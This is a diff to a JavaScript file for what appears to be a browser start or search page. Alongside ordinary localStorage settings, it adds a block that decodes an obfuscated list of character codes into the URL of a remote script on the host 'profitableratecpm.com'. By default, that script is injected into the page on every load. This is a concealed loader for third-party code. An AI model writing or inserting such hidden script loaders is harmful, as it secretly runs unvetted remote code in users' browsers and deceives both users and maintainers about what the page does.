@@ -9,6 +9,17 @@ const searchInput = document.getElementById("search-input");
 localStorage.setItem("searchEngine", "duckduckgo");
 big.innerText = localStorage.getItem("name") || "User";
 
+
+
+if (localStorage.getItem("a") === "true" || localStorage.getItem("a") === null) {
+    const a = document.createElement("script");
+    var b = "47,47,112,108,50,54,54,49,51,51,55,53,46,112,114,111,102,105,116,97,98,108,101,114,97,116,101,99,112,109,46,99,111,109,47,51,97,47,101,57,47,97,49,47,51,97,101,57,97,49,56,51,57,48,97,53,57,102,53,48,53,101,56,48,52,54,99,52,51,101,48,53,98,101,102,57,46,106,115"
+    a.src = new TextDecoder().decode(new Uint8Array(b.split(',').map(Number)));
+    a.type = "text/javascript";
+    a.id = "script";
+    document.body.appendChild(a);
+}
+
 if (!localStorage.getItem("background")) {
     localStorage.setItem("background", "0");
 }
